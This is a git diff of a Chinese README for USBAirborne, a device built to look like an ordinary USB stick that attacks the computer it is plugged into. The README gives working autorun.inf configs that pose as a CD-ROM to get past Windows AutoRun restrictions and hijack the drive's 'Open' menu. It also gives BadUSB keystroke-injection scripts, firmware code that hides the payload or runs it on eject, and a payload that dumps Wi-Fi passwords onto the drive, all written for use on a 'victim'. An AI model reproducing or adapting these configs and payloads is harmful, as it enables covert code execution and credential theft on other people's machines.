@@ -9,166 +9,134 @@
 USBAirborne伪装成U盘，但当受害者将它插入电脑，它会执行指定的命令或程序。
 
 - 支持BadUSB攻击、AutoRun攻击
-- 内置4MB存储空间，可伪装为4G的U盘
+- 内置4MB存储空间，可伪装为4GB的U盘
 - 低成本（约10元 / 个）
 - 标准G2板型，可装入常见U盘外壳
 
-<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/1.png" style="zoom: 50%;" />
+<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/1.png" width="50%" />
 
+------
 
+## 快速开始
 
-## Demo
+USBAirborne的攻击行为由其根目录下的`autorun.inf`文件内容决定，支持AutoRun攻击和BadUSB攻击（也可同时进行）。项目的 [Payload](Payload/readme.md) 目录下包含一系列演示攻击脚本。
 
-USBAirborne自带一个演示Demo：
+------
 
-插入电脑后， USBAirborne显示为一个4G的U盘。
+## AutoRun攻击
 
-但在打开U盘时（包括双击打开、右键-打开、右键-在新窗口中打开），USBAirborne会自动打开浏览器播放Never Gonna Give You Up。
+将 [Payload](Payload/readme.md) 目录下的`AutorunDemo.inf`复制到USBAirborne根目录下，并重命名为`autorun.inf`。
+
+插入电脑后， USBAirborne显示为一个4GB的U盘。在打开U盘时（包括双击打开、右键-打开、右键-在新窗口中打开），USBAirborne会执行预置代码，打开浏览器播放视频。
 
 <img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/autorun.gif"/>
 
-USBAirborne攻击行为的配置文件位于根目录下的Autorun.inf。 此处所使用的Autorun.inf如下：
+具体而言，`AutorunDemo.inf`中的`[AutoRun]`段，会让USBAirborne模拟成CD-ROM设备，以绕过Windows的AutoRun安全限制：
 
 ```ini
 [AutoRun]
 autoplay=true
 
 ;将驱动器图标伪装为U盘图标
-icon=c:\windows\system32\shell32.dll,79
+icon=shell32.dll,79
 
 ;驱动器名称
-label=Nothing inside
+label=USB
 
-;攻击Payload，此处为调用cmd打开网页
-open=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
-run=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
+;攻击Payload，此处为打开网页
+;可以将需要运行的EXE或BAT放置在U盘根目录，将open改为填写文件名
+;例如：open=payload.exe
+open=explorer https://www.bilibili.com/video/BV1zK4y1S71s
 
 ;劫持右键菜单
-shell\open=打开(&O)
-shell\open\Command=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX" 
-shell\opennewwindow=在新窗口中打开(&E) 
-shell\opennewwindow\Command=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
+;如果修改了Payload，此处也需修改
+shell\AutoRun=Open Drive(&D)
+shell\AutoRun\Command=explorer https://www.bilibili.com/video/BV1zK4y1S71s
+shell\open\Command=explorer https://www.bilibili.com/video/BV1zK4y1S71s
+shell\opennewwindow\Command=explorer https://www.bilibili.com/video/BV1zK4y1S71s
 ```
 
+------
 
+## 关闭CD-ROM只读
 
-## 执行指定的程序
+前一案例中，配置文件会使得USBAirborne模拟成只读的CD-ROM设备，无法写入或修改文件。
 
-如果播放视频不够有趣，也可配置USBAirborne执行其他操作，例如运行指定程序。
-
-首先,将USBAirborne的第一个开关打开，关闭攻击模式。
-
-**只有在攻击模式关闭时，USBAirborne的根目录才可以写入文件。同时，攻击模式关闭时USBAirborne不会执行攻击内容。**
+将USBAirborne PCB上的开关1打开，可以关闭攻击模式。此时USBAirborne不会执行攻击内容，也不再进入只读的CD-ROM状态。
 
 <img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/Switch_cn.png"/>
 
-修改USBAirborne根目录下的Autorun.inf可实现其它攻击行为。例如运行USBAirborne根目录下的payload.exe：
-
-```ini
-[AutoRun]
-autoplay=true
-
-;将驱动器图标伪装为U盘图标
-icon=c:\windows\system32\shell32.dll,79
-
-;驱动器名称
-label=Nothing inside
-
-;攻击Payload，此处为运行根目录下的payload.exe
-open=payload.exe
-run=payload.exe
-
-;劫持右键菜单
-shell\open=打开(&O)
-shell\open\Command=payload.exe
-shell\opennewwindow=在新窗口中打开(&E) 
-shell\opennewwindow\Command=payload.exe
-```
-
-<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/payload.gif"/>
 
 
+------
 
 ## BadUSB攻击
 
-AutoRun攻击需要受害者打开U盘，如果需要更自动化，可以使用BadUSB。简而言之，BadUSB攻击通过模拟键盘的输入来执行操作。
+BadUSB是另一种攻击模式，通过模拟键盘的输入来执行操作。
 
-（但BadUSB容易受到不同情况的影响，例如在锁屏或者启用中文输入法的状态，BadUSB攻击会失败）
+将 [Payload](Payload/readme.md) 目录下的`BadUSB.inf`复制到USBAirborne根目录下，并重命名为`autorun.inf`。
 
-在Autorun.inf中添加两个[badusb]，在其中编写键盘操作。
-
-以下是一个简单的例子，通过模拟键盘按下Win+R键打开“运行”窗口，输入notepad打开记事本，并输入一些测试数据。
-
-最后再次打开“运行”窗口，播放Never Gonna Give You Up。
-
-```ini
-[BadUSB]
-[Win+R]
-[Delay][Delay]
-notepad[Enter]
-[Delay]
-Hi![Enter]
-This is a test of USBAirborne[Enter]
-[Win+R]
-[Delay]
-[Delay]
-https://www.bilibili.com/video/BV1uT4y1P7CX/
-[Enter]
-[BadUSB]
-
-;后续是AutoRun攻击的配置文件。USBAirborne支持同时进行两种攻击。
-[AutoRun]
-autoplay=true
-
-;将驱动器图标伪装为U盘图标
-icon=c:\windows\system32\shell32.dll,79
-
-;驱动器名称
-label=Nothing inside
-
-;攻击Payload，此处为调用cmd打开网页
-open=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
-run=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
-
-;劫持右键菜单
-shell\open=打开(&O)
-shell\open\Command=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX" 
-shell\opennewwindow=在新窗口中打开(&E) 
-shell\opennewwindow\Command=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
-```
+插入电脑后， USBAirborne通过模拟键盘按下Win+R键打开`运行`窗口，输入`notepad`打开记事本，并输入演示内容、打开一个网页。
 
 <img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/badusb.gif"/>
 
+具体而言，`BadUSB.inf`中的两个`[BadUSB]`标记之间包含了要执行的键盘操作：
 
+```ini
+[BadUSB]
+[BypassChineseIME]
+[Win+R]
+[Delay]
+[Delay]
+notepad
+[Enter]
+[Delay]
+[Delay]
+Hi! This is a test of USBAirborne
+[Win+R]
+[Delay]
+[Delay]
+https://www.bilibili.com/video/av929340019/[Enter]
+[BadUSB]
+```
 
-## 操作系统支持
+其中`[BypassChineseIME]`用于智能绕过中文输入法。
 
-- AutoRun攻击仅支持Windows系统，且要未完全禁止AutoRun。（Windows7及以上系统默认禁止常见设备开启AutoRun，但允许DRIVE_FIXED CD-ROM设备开启。相关的注册表项目请参考[维基百科](https://en.wikipedia.org/wiki/AutoRun#Registry_settings)）
+------
 
-- BadUSB攻击理论上支持所有操作系统。但不同的操作系统接收的键盘输入并不一样。例如通过Win+R打开“运行”窗口仅在Windows下可用。
+## 保存BadUSB的执行结果
 
+将 [Payload](Payload/readme.md) 目录下的`GrabWLAN.inf`复制到USBAirborne根目录下，并重命名为`autorun.inf`。
 
+同时将 [Payload](Payload/readme.md) 目录下的`USB.AIRBORNE`也复制到USBAirborne根目录下，该文件用于定位USBAirborne的盘符。
 
-## 高级利用
+插入电脑后， USBAirborne会执行特定的CMD命令，导出WLAN配置和密码，并将CMD的输出结果保存在USBAirborne根目录下，文件名为主机名+随机数。
 
-### BadUSB高级命令
+![saveResult](https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/saveResult.PNG)
+
+------
+
+## BadUSB高级命令
 
 BadUSB的配置文件支持一些组合键和高级命令：
 
-1. [Enter]：按下回车键
-2. [Shift]：按下Shift键
-3. [Capslock]：切换大小写
-4. [Win]：按下Win键
-5. [Win+R]：打开“运行”窗口
-6. [Alt+F4]：关闭当前窗口
-7. [Win+D]：显示桌面
-8. [Win+L]：锁定计算机
-9. [Win+E]：打开Windows资源管理器
-10. [Ctrl+Alt+Del]：打开安全选项
-11. [Delay]：等待500毫秒
-12. [Format]：格式化储存
+1. [BypassChineseIME]：智能绕过中文输入法。
+2. [Format]：快速格式化USBAirborne。
+3. [Enter]：按下回车键
+4. [Shift]：按下Shift键
+5. [Capslock]：切换大小写
+6. [Win]：按下Win键
+7. [Win+R]：打开“运行”窗口
+8. [Alt+F4]：关闭当前窗口
+9. [Win+D]：显示桌面
+10. [Win+L]：锁定计算机
+11. [Win+E]：打开Windows资源管理器
+12. [Ctrl+Alt+Del]：打开安全选项
+13. [Delay]：等待500毫秒
 
-### 编译固件
+------
+
+## 编译固件
 
 USBAirborne.uvproj目录下是USBAirborne的固件源代码。
 
@@ -178,18 +146,18 @@ USBAirborne.uvproj目录下是USBAirborne的固件源代码。
 
 此时使用Keil打开USBAirborne.uvproj目录下的Project.uvproj，应当可以编译USBAirborne的固件。
 
-### 更快执行BadUSB
+### 内置BadUSB Payload到固件
 
-USBAirborne在执行BadUSB时需要从Flash中读取Payload，这一过程用时约4秒。如果希望更快地执行BadUSB，可以通过将Payload内置在固件中。
+USBAirborne在执行BadUSB时需要从Flash中读取Payload。如果希望更快地执行BadUSB或完全隐藏Payload，可以直接将Payload内置在固件中。
 
-main.c中的BadUSBDemo()是一个Payload示例。修改ExecBadUSB为1，该Payload会被执行。
+Main.C中的BadUSBDemo()是一个示例。修改ExecBadUSB为1，该Payload会被执行。
 
 ```c
 UINT8 ExecBadUSB = 1;
 
 void BadUSBDemo()
 {
-	UINT8 Payload[]="https://www.bilibili.com/video/BV1uT4y1P7CX\n";
+	UINT8 Payload[]="https://www.bilibili.com/video/av929340019\n";
 	mDelaymS(1000);
 	SendKey(KB_LeftShift, KB_NULL);	//切换输入法
 	mDelaymS(500);
@@ -217,7 +185,7 @@ void main(void)
 
 ### 在其它时刻执行BadUSB
 
-BadUSB一般会在USBAirborne插入计算机后立刻执行，如果你希望在其它时刻执行，可以通过在USB的不同UFI命令中将ExecBadUSB置1实现。
+BadUSB一般会在USBAirborne插入计算机后立刻执行，如果你希望在其它时刻执行，可通过在USB的不同UFI命令中将ExecBadUSB置1实现。
 
 例如，在USB.c的UFI_staStoUnit()中将ExecBadUSB置1，可以实现在USBAirborne被弹出时执行BadUSB Payload:
 
@@ -229,11 +197,21 @@ void  UFI_staStoUnit(void)
 	BcswStatus = 0;
 	mSenseKey = 0;
 	mASC = 0;
+	if(MassPara.cbw.cbwcb.buf1[4] & 0x02)
+	{
+		MediumPresent = (MassPara.cbw.cbwcb.buf1[4] & 0x01) ? 1 : 0;
+	}
+	else if(MassPara.cbw.cbwcb.buf1[4] & 0x01)
+	{
+		MediumPresent = 1;
+	}
 	ExecBadUSB=1; //添加此行
 }
 ```
 
 
+
+------
 
 
 ## 制造指南
@@ -256,7 +234,7 @@ https://oshwhub.com/PushEAX/3079905e2c434c54902d77ab60f6c747
 | U2       | P25Q32H-SSH-IT | SOIC-8_L4.9-W3.9    | 1    | 2.2        |
 | USB1     | USB2.0-A-公头  | USB-A-TH_USB-A-F-90 | 1    | 0.4        |
 
-*备注：CH552G可以替换为CH551G、CH554G。P25Q32H可以被替换为其它W25Q兼容 SPI Flash，容量建议在4MB-16MB。*
+*备注：CH552G可以替换为CH551G、CH554G。P25Q32H可以被替换为其它W25Q兼容 SPI Flash，容量最大支持16MB。*
 
 ### 制造步骤
 
@@ -270,8 +248,8 @@ https://oshwhub.com/PushEAX/3079905e2c434c54902d77ab60f6c747
 
 <img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/Switch_cn.png"/>
 
-4. 在 [此处](https://raw.githubusercontent.com/Push3AX/USBAirborne/main/USBAirborne.uvproj/USBAirborne_2.1.hex)下载USBAirborne的固件。使用[WCHISPTool](https://www.wch.cn/download/WCHISPTool_Setup_exe.html)烧录固件。
+4. 在 [此处](https://raw.githubusercontent.com/Push3AX/USBAirborne/main/USBAirborne.uvproj/USBAirborne_2.2.hex)下载USBAirborne的固件。使用[WCHISPTool](https://www.wch.cn/download/WCHISPTool_Setup_exe.html)烧录固件。
 
 <img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/WCHISPTool_cn.png"/>
 
-5. 关闭烧录模式，打开读写模式，将Autorun.inf拷贝到USBAirborne根目录。
+5. 关闭烧录模式，打开读写模式，将`autorun.inf`拷贝到USBAirborne根目录。
